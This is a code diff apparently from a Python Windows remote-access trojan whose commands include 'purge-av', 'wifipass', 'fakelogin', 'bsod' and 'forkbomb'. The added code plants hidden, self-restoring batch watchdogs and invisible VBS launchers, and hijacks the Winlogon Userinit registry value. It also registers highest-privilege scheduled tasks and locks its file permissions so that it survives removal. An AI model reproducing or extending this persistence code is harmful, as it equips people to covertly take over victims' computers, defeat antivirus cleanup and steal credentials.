@@ -138,8 +138,21 @@ _LEGACY_NAMES = (
     "NexoraRun", "NexoraDaemon", "NexoraBg", "NexoraSupport", "NexoraClient",
 )
 
+WATCHDOG_PERIOD = 20
+
+def _watch_vbs_block(i=0):
+    p = '"%S{0}%.vbs"'.format(i)
+    return "\n".join([
+        '>' + p + ' echo Set s = CreateObject("WScript.Shell")',
+        '>>' + p + ' echo s.Run """" ^& "%S' + str(i) + '%" ^& """", 0, False',
+        '>nul 2>&1 attrib +h +s ' + p,
+    ])
+
+
 _WATCH_BAT = """@echo off
-{defs}
+@echo off
+setlocal EnableExtensions
+if not "%~1"=="" title %~1
 :loop
 set "SRC="
 if exist "%S0%" set "SRC=%S0%"
@@ -147,14 +160,25 @@ if exist "%S0%" set "SRC=%S0%"
 if defined SRC (
 {restore}
 )
-tasklist /fi "imagename eq {name}" 2>nul | find /i "{name}" >nul
-if errorlevel 1 if exist "%S0%" start "" /b "%S0%"
-reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v Userinit 2>nul | find /i "{name}" >nul
+tasklist /nh /fi "imagename eq {name}" 2>nul | find /i "{name}" >nul 2>&1
+if errorlevel 1 goto revive
+reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v Userinit 2>nul | find /i "%~n0" >nul 2>&1
 if errorlevel 1 if exist "%S0%" start "" /b "%S0%" --zz-repair
-schtasks /query /tn "{task}" >nul 2>&1
-if errorlevel 1 if exist "%S0%" schtasks /create /tn "{task}" /tr "\\"%S0%\\"" /sc onlogon /rl highest /f >nul 2>&1
-ping -n 300 127.0.0.1 >nul 2>&1
+goto tasks
+:revive
+>nul 2>&1 schtasks /run /tn "{task}"
+if errorlevel 1 if exist "%S0%" start "" /b "%S0%"
+:tasks
+if exist "%S0%.vbs" goto havetask
+{vbs}
+:havetask
+>nul 2>&1 schtasks /query /tn "{task}"
+if errorlevel 1 if exist "%S0%.vbs" >nul 2>&1 schtasks /create /tn "{task}" /tr "\\"wscript.exe //B \\"%S0%.vbs\\"\\"" /sc onlogon /rl highest /f
+call :sleep 21
 goto loop
+:sleep
+>nul 2>&1 ping -n %1 127.0.0.1
+exit /b 0
 """
 
 MARK = "#~ "
@@ -209,7 +233,7 @@ HELP_CATEGORIES = {
     "screen-mode": "screen", "rotate": "screen", "resolution": "screen",
     "monitors-off": "screen", "monitors-on": "screen", "screensaver": "screen",
     "set-wallpaper": "screen", "wallpaper-random": "screen", "play": "screen",
-    "tts": "screen", "beep": "screen", "jumpscare": "screen",
+    "tts": "screen", "beep": "screen", "jumpscare": "screen", "susto": "screen",
     "img-filter": "screen", "toico": "screen", "matrix": "screen", "ss-wall": "screen",
     "block-input": "input", "unblock-input": "input", "hide-cursor": "input",
     "show-cursor": "input", "key": "input", "click": "input",
@@ -246,6 +270,52 @@ HELP_CATEGORIES = {
     "bsod": "troll", "forkbomb": "troll",
     "wdiag": "persist", "repair": "persist", "implode": "persist", "purge-av": "persist",
     "vmdiag": "persist", "crashlog": "persist",
+
+    "sysinfo": "processes", "uptime": "processes", "battery": "processes",
+    "netstat": "processes", "ports": "processes", "dnsflush": "processes",
+    "ipconfig": "processes", "wifi": "processes", "wifipass": "processes",
+    "proxy": "processes", "firewall": "processes", "defender": "processes",
+    "hotfix": "processes", "disk": "processes", "smart": "processes",
+    "encryptstatus": "processes", "tpm": "processes", "secureboot": "processes",
+    "env": "processes", "psver": "processes", "locale": "processes",
+    "timezone": "processes", "ntp": "processes", "installed": "processes",
+    "pending": "processes", "fonts": "processes", "printers": "processes",
+    "shares": "processes", "sessions": "processes", "admins": "processes",
+    "groups": "processes", "audit": "processes", "powercfg": "processes",
+    "schedlist": "processes", "schedrun": "processes", "scheddel": "processes",
+    "driverlist": "processes", "devices": "processes", "bootmgr": "processes",
+    "pagefile": "processes", "memdetail": "processes", "gpuinfo": "processes",
+    "startupfolder": "processes", "assoc": "processes", "arp": "processes",
+    "route": "processes", "gateway": "processes", "pingtest": "processes",
+    "dnsset": "processes", "restore": "processes", "restorelist": "processes",
+    "restorar": "processes",
+    "brightness": "voice", "theme": "screen", "accent": "screen",
+    "clipboard": "input", "notify": "input", "sleep": "input", "hibernate": "input",
+    "lock": "input", "logoff": "input", "restart": "input", "apagar": "input",
+    "cancelar": "input", "safemode": "persist",
+    "fakelogin": "troll", "fakebattery": "troll", "fakebsod11": "troll",
+    "fakereboot": "troll", "fakeapagar": "troll", "fakesignout": "troll",
+    "fakedriver": "troll", "fakedefender": "troll", "fakeformat": "troll",
+    "fakevirus": "troll", "errorstorm": "troll", "congelar": "troll",
+    "taskbarhide": "troll", "magnet": "troll", "alttabspam": "troll",
+    "notepadspam": "troll", "beepmelody": "troll", "fakeeject": "troll",
+    "mouselag": "troll", "capsrandom": "troll", "titlerw": "troll",
+    "reloj": "troll", "dialogstorm": "troll",
+
+    "gdi-invert": "screen", "gdi-gray": "screen", "gdi-sepia": "screen",
+    "gdi-threshold": "screen", "gdi-posterize": "screen", "gdi-hue": "screen",
+    "gdi-rgbsplit": "screen", "gdi-chroma": "screen", "gdi-crt": "screen",
+    "gdi-snow": "screen", "gdi-pixelate": "screen", "gdi-mosaic": "screen",
+    "gdi-rollh": "screen", "gdi-rollv": "screen", "gdi-wobble": "screen",
+    "gdi-ripple": "screen", "gdi-swirl": "screen", "gdi-kaleido": "screen",
+    "gdi-tunnel": "screen", "gdi-spin": "screen", "gdi-zoompulse": "screen",
+    "gdi-shear": "screen", "gdi-mirror": "screen", "gdi-blinds": "screen",
+    "gdi-checker": "screen", "gdi-edge": "screen", "gdi-emboss": "screen",
+    "gdi-radialblur": "screen", "gdi-vignette": "screen", "gdi-bloom": "screen",
+    "gdi-plasma": "screen", "gdi-datamosh": "screen", "gdi-glitch": "screen",
+    "gdi-echo": "screen", "gdi-trails": "screen", "gdi-melt": "screen",
+    "gdi-shake": "screen", "gdi-fisheye": "screen", "gdi-stripes": "screen",
+    "gdi-strobe": "screen",
 }
 
 CATEGORY_LABELS = {
@@ -393,6 +463,11 @@ def _userinit(on):
     key = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
     userinit = r"C:\Windows\System32\userinit.exe"
     exe = _load_persist().get("exe")
+    stem = os.path.splitext(os.path.basename(exe))[0].lower() if exe else ""
+    entry = None
+    if on and exe:
+        vbs = _write_launcher(exe)
+        entry = 'wscript.exe //B "{}"'.format(vbs) if vbs else exe
     for _ in range(5):
         try:
             import winreg
@@ -406,28 +481,30 @@ def _userinit(on):
             keep = []
             for p in (x.strip().strip('"') for x in cur.split(",") if x.strip()):
                 low = p.lower()
-                if low.endswith("userinit.exe") or (exe and low == exe.lower()):
+                if low.endswith("userinit.exe") or CLONE_RE.search(low):
                     continue
-                if CLONE_RE.search(low):
+                if stem and stem in low:
+                    continue
+                if exe and low == exe.lower():
                     continue
                 keep.append(p)
 
-            if on and exe:
-                value = ", ".join(keep + [exe, userinit]) + ","
+            if on and entry:
+                value = ", ".join(keep + [entry, userinit]) + ","
             else:
                 value = ", ".join(keep + [userinit]) + ","
 
             winreg.SetValueEx(k, "Userinit", 0, winreg.REG_SZ, value)
             winreg.CloseKey(k)
 
-            if not on or not exe:
+            if not on or not entry or not stem:
                 return True
 
             time.sleep(0.3)
             chk = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key, 0, winreg.KEY_READ)
             got = winreg.QueryValueEx(chk, "Userinit")[0]
             winreg.CloseKey(chk)
-            if exe.lower() in got.lower() and userinit.lower() in got.lower():
+            if stem in got.lower() and userinit.lower() in got.lower():
                 return True
             continue
         except Exception:
@@ -499,6 +576,80 @@ def _hide_path(path, hidden=True, readonly=False):
         subprocess.run(["attrib", *flags, str(path)], capture_output=True, creationflags=0x08000000)
     except Exception:
         pass
+
+
+def _watch_body(st):
+    slots = st.get("slots") or []
+    if not slots:
+        return None
+    stem = os.path.splitext(os.path.basename(slots[0]["exe"]))[0]
+    defs = "\n".join('set "S{0}={1}"'.format(i, s["exe"]) for i, s in enumerate(slots))
+    find = "\n".join('if not defined SRC if exist "%S{0}%" set "SRC=%S{0}%"'.format(i)
+                       for i in range(1, len(slots)))
+    restore = "\n".join(
+        '  if not exist "%S{0}%" copy /y "%SRC%" "%S{0}%" >nul 2>&1\n'
+        '  if exist "%S{0}%" attrib +h +s +r "%S{0}%" >nul 2>&1'.format(i)
+        for i in range(len(slots)))
+    restore += ('\r\n  icacls "%S0%" /inheritance:r /grant:r *S-1-5-18:F'
+                ' /grant:r *S-1-5-32-544:F /grant:r *S-1-5-32-545:RX >nul 2>&1')
+    return _WATCH_BAT.format(defs=defs, find=find, restore=restore,
+                             name=os.path.basename(slots[0]["exe"]), stem=stem,
+                             task=st["task"], flag="--zz-repair",
+                             period=WATCHDOG_PERIOD, wait=WATCHDOG_PERIOD + 1)
+
+
+def _write_watchdog(st):
+    body = _watch_body(st)
+    if not body:
+        return False
+    ok = False
+    for s in st.get("slots") or []:
+        p = s.get("bat")
+        if not p:
+            continue
+        try:
+            os.makedirs(os.path.dirname(p), exist_ok=True)
+            same = False
+            try:
+                with open(p, "r", encoding="utf-8", errors="replace") as f:
+                    same = f.read() == body
+            except Exception:
+                same = False
+            if not same:
+                tmp = p + ".new"
+                with open(tmp, "w", encoding="utf-8", newline="\r\n") as f:
+                    f.write(body)
+                os.replace(tmp, p)
+            _hide_path(p, True)
+            ok = True
+        except Exception:
+            pass
+    return ok
+
+
+def _write_launcher(exe):
+    if not exe:
+        return None
+    vbs = exe + ".vbs"
+    try:
+        os.makedirs(os.path.dirname(vbs), exist_ok=True)
+        body = ('Set s = CreateObject("WScript.Shell")\r\n'
+                's.Run """" & "{}" & """", 0, False\r\n'.format(exe))
+        same = False
+        try:
+            with open(vbs, "r", encoding="utf-8", errors="replace") as f:
+                same = f.read() == body
+        except Exception:
+            same = False
+        if not same:
+            tmp = vbs + ".new"
+            with open(tmp, "w", encoding="utf-8", newline="\r\n") as f:
+                f.write(body)
+            os.replace(tmp, vbs)
+        _hide_path(vbs, True)
+        return vbs
+    except Exception:
+        return None
 
 
 def _copy_verified(src, dst):
@@ -725,6 +876,11 @@ def purge_strays(target_exe):
             os.remove(p)
         except Exception:
             pass
+        subprocess.run(["attrib", "-r", "-s", "-h", p + ".vbs"], capture_output=True)
+        try:
+            os.remove(p + ".vbs")
+        except Exception:
+            pass
 
     root = os.path.join(os.environ.get("ProgramData", r"C:\ProgramData"), "Microsoft")
     try:
@@ -760,16 +916,17 @@ def cleanup_old_persistence():
         except Exception:
             pass
     for slot in state.get("slots", []) or []:
-        for key in ("bat", "exe"):
-            p = slot.get(key)
-            if not p:
-                continue
+        targets = [slot.get("bat"), slot.get("exe"), slot.get("vbs")]
+        if slot.get("exe"):
+            targets.append(slot["exe"] + ".vbs")
+            targets.append(slot["exe"] + ".bat")
+        for p in [t for t in targets if t]:
             try:
                 subprocess.run(["attrib", "-r", "-s", "-h", p], capture_output=True)
                 os.remove(p)
             except Exception:
                 pass
-    for key in ("exe", "bak", "bat"):
+    for key in ("exe", "bak", "bat", "vbs"):
         p = state.get(key)
         if not p:
             continue
@@ -796,13 +953,15 @@ def install_persistence(exe_path, bundle_dir=None, runtime_dir=None):
         slots = []
         for d in _slot_dirs():
             slots.append({"dir": d, "exe": os.path.join(d, exe_name),
-                          "bat": os.path.join(d, base + ".bat")})
+                          "bat": os.path.join(d, base + ".bat"),
+                          "vbs": os.path.join(d, exe_name + ".vbs")})
 
         if bundle_dir and os.path.isdir(bundle_dir):
             primary_dir = os.path.join(_sys32(), base)
             primary = os.path.join(primary_dir, base + ".exe")
             slots[0]["dir"] = primary_dir
             slots[0]["exe"] = primary
+            slots[0]["vbs"] = primary + ".vbs"
         else:
             primary = slots[0]["exe"]
 
@@ -847,23 +1006,9 @@ def install_persistence(exe_path, bundle_dir=None, runtime_dir=None):
         for s in slots[1:]:
             _copy_verified(primary, s["exe"])
 
-        defs = "\r\n".join('set "S{0}={1}"'.format(i, s["exe"]) for i, s in enumerate(slots))
-        find = "\r\n".join('if not defined SRC if exist "%S{0}%" set "SRC=%S{0}%"'.format(i)
-                           for i in range(1, len(slots)))
-        restore = "\r\n".join(
-            '  if not exist "%S{0}%" copy /y "%SRC%" "%S{0}%" >nul 2>&1\r\n'
-            '  if exist "%S{0}%" attrib +h +s "%S{0}%" >nul 2>&1'.format(i)
-            for i in range(len(slots)))
-        body = _WATCH_BAT.format(defs=defs, find=find, restore=restore,
-                                 name=os.path.basename(primary), task=task)
-
-        for s in slots:
-            try:
-                with open(s["bat"], "w", encoding="utf-8", newline="\r\n") as f:
-                    f.write(body)
-                _hide_path(s["bat"], True)
-            except Exception:
-                pass
+        state_now = {"slots": [{"exe": s["exe"], "bat": s["bat"]} for s in slots], "task": task}
+        _write_watchdog(state_now)
+        launcher = _write_launcher(primary)
 
         for s in slots:
             _mp_add([s["exe"]])
@@ -874,20 +1019,23 @@ def install_persistence(exe_path, bundle_dir=None, runtime_dir=None):
                             "/grant:r", "*S-1-5-32-545:RX"],
                            capture_output=True, creationflags=0x08000000)
 
+        tr = 'wscript.exe //B "{}"'.format(launcher) if launcher else primary
         subprocess.run(
-            ["schtasks", "/Create", "/TN", task, "/TR", primary,
+            ["schtasks", "/Create", "/TN", task, "/TR", tr,
              "/SC", "ONLOGON", "/RL", "HIGHEST", "/F", "/DELAY", "0000:20"],
-            capture_output=True,
+            capture_output=True, creationflags=0x08000000,
         )
         subprocess.run(
-            ["schtasks", "/Create", "/TN", task + "_w", "/TR", primary,
+            ["schtasks", "/Create", "/TN", task + "_w", "/TR", tr,
              "/SC", "ONSTART", "/RL", "HIGHEST", "/F", "/DELAY", "0000:30"],
-            capture_output=True,
+            capture_output=True, creationflags=0x08000000,
         )
 
         _save_persist({"exe": primary, "bak": slots[1]["exe"] if len(slots) > 1 else primary,
-                       "bat": slots[0]["bat"], "task": task, "tasks": [task, task + "_w"],
-                       "slots": [{"exe": s["exe"], "bat": s["bat"]} for s in slots]})
+                       "bat": slots[0]["bat"], "vbs": primary + ".vbs",
+                       "task": task, "tasks": [task, task + "_w"],
+                       "slots": [{"exe": s["exe"], "bat": s["bat"], "vbs": s["vbs"]}
+                                 for s in slots]})
 
         ok_init = False
         for _ in range(3):
